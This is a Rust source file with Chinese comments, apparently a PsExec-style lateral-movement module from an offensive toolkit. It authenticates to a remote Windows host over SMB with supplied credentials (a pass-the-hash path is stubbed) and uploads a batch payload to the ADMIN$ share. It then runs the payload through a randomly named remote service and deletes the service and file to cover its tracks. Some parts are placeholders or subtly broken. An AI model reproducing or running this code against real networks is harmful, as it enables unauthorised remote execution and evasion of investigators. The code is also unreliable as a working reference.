//! PsExec 横向移动模块
//!
//! 上传可执行文件后创建Windows服务来远程执行命令。

use crate::lateral::{random_service_name, LateralConfig};

/// 执行PsExec横向移动
pub async fn execute_psexec(config: &LateralConfig) -> Result<(String, String, i32), String> {
    let target = &config.target;
    let service_name = config.service_name.clone()
        .unwrap_or_else(|| random_service_name());
    let binary_name = format!("{}.exe", service_name);

    tracing::info!("[PsExec] {} -> {} (服务: {})", whoami::hostname(), target, service_name);

    // 1. 建立SMB连接并认证
    connect_smb(target, &config.credential)?;

    // 2. 上传payload到ADMIN$
    let admin_share = format!("\\\\{}\\ADMIN$", target);
    let target_path = format!("{}\\{}", admin_share, binary_name);

    upload_payload(target, &target_path, &config.command, &config.args)?;

    // 3. 创建并启动服务
    create_and_start_service(target, &service_name, &binary_name)?;

    // 4. 收集命令输出
    let (stdout, stderr, exit_code) = collect_output(target, &service_name)?;

    // 5. 停止并删除服务
    cleanup_service(target, &service_name, &binary_name)?;

    Ok((stdout, stderr, exit_code))
}

/// 建立SMB连接
fn connect_smb(target: &str, credential: &crate::lateral::LateralCredential) -> Result<(), String> {
    // 使用net use命令建立IPC$连接
    let (username, password) = match credential {
        crate::lateral::LateralCredential::Cleartext { username, password, domain } => {
            let full_user = if let Some(ref d) = domain {
                format!("{}\\{}", d, username)
            } else {
                username.clone()
            };
            (full_user, Some(password.clone()))
        }
        crate::lateral::LateralCredential::NtlmHash { username, domain, .. } => {
            let full_user = if let Some(ref d) = domain {
                format!("{}\\{}", d, username)
            } else {
                username.clone()
            };
            (full_user, None) // PtH需要特殊处理
        }
        _ => (whoami::username(), None),
    };

    let ipc_share = format!("\\\\{}\\IPC$", target);

    let mut cmd = std::process::Command::new("net");
    cmd.args(["use", &ipc_share]);

    if let Some(ref pass) = password {
        cmd.arg(pass);
    }
    cmd.arg("/user:").arg(&username);

    let output = cmd.output()
        .map_err(|e| format!("net use失败: {}", e))?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        // 检查是否已经建立连接
        if !stderr.contains("已经连接") && !stderr.contains("already connected") {
            return Err(format!("SMB连接失败: {}", stderr));
        }
    }

    Ok(())
}

/// 上传payload到目标主机
fn upload_payload(
    target: &str,
    target_path: &str,
    command: &str,
    args: &[String],
) -> Result<(), String> {
    // 创建批处理脚本作为payload
    let temp_dir = std::env::temp_dir();
    let local_batch = temp_dir.join("psexec_payload.bat");

    let batch_content = format!(
        "@echo off\r\n{} {}\r\necho EXIT_CODE=%ERRORLEVEL%",
        command,
        args.join(" ")
    );
    std::fs::write(&local_batch, &batch_content)
        .map_err(|e| format!("创建payload失败: {}", e))?;

    // 复制到目标
    let output = std::process::Command::new("copy")
        .args([&local_batch.to_string_lossy(), target_path])
        .output()
        .map_err(|e| format!("上传payload失败: {}", e))?;

    if !output.status.success() {
        return Err(format!(
            "上传payload失败: {}",
            String::from_utf8_lossy(&output.stderr)
        ));
    }

    // 清理本地临时文件
    let _ = std::fs::remove_file(&local_batch);

    Ok(())
}

/// 创建并启动Windows服务
fn create_and_start_service(
    target: &str,
    service_name: &str,
    binary_name: &str,
) -> Result<(), String> {
    let binary_path = format!("C:\\Windows\\{}", binary_name);

    // 使用sc命令创建服务
    let create_output = std::process::Command::new("sc")
        .args([
            &format!("\\\\{}", target),
            "create",
            service_name,
            "binPath=",
            &format!("cmd.exe /c {}", binary_path),
            "type=", "own",
            "start=", "demand",
            "error=", "ignore",
        ])
        .output()
        .map_err(|e| format!("sc create失败: {}", e))?;

    if !create_output.status.success() {
        return Err(format!(
            "服务创建失败: {}",
            String::from_utf8_lossy(&create_output.stderr)
        ));
    }

    // 启动服务
    let start_output = std::process::Command::new("sc")
        .args([&format!("\\\\{}", target), "start", service_name])
        .output()
        .map_err(|e| format!("sc start失败: {}", e))?;

    if !start_output.status.success() {
        // 尝试删除服务
        let _ = cleanup_service(target, service_name, binary_name);
        return Err(format!(
            "服务启动失败: {}",
            String::from_utf8_lossy(&start_output.stderr)
        ));
    }

    Ok(())
}

/// 收集命令输出
fn collect_output(
    target: &str,
    service_name: &str,
) -> Result<(String, String, i32), String> {
    // 在实际实现中，需要从目标主机读取输出文件
    // PsExec通常在目标上创建命名管道或输出文件

    // 简化实现：尝试通过服务状态获取输出
    let output = std::process::Command::new("sc")
        .args([&format!("\\\\{}", target), "qc", service_name])
        .output();

    let stdout = match output {
        Ok(o) => String::from_utf8_lossy(&o.stdout).to_string(),
        Err(_) => String::new(),
    };
    let stderr = String::new();
    let exit_code = 0;

    Ok((stdout, stderr, exit_code))
}

/// 清理服务和文件
fn cleanup_service(target: &str, service_name: &str, binary_name: &str) -> Result<(), String> {
    // 停止服务
    let _ = std::process::Command::new("sc")
        .args([&format!("\\\\{}", target), "stop", service_name])
        .output();

    // 删除服务
    let _ = std::process::Command::new("sc")
        .args([&format!("\\\\{}", target), "delete", service_name])
        .output();

    // 删除二进制文件
    let binary_path = format!("\\\\{}\\ADMIN$\\{}", target, binary_name);
    let _ = std::fs::remove_file(&binary_path);

    // 断开SMB连接
    let ipc_share = format!("\\\\{}\\IPC$", target);
    let _ = std::process::Command::new("net")
        .args(["use", &ipc_share, "/delete"])
        .output();

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_service_name_generation() {
        let name = random_service_name();
        assert!(!name.is_empty());
    }

    #[test]
    fn test_payload_creation() {
        let temp = std::env::temp_dir();
        let result = upload_payload("localhost", &temp.join("test.bat").to_string_lossy(), "whoami", &[]);
        // 可能失败（权限不足），但不应该panic
    }
}
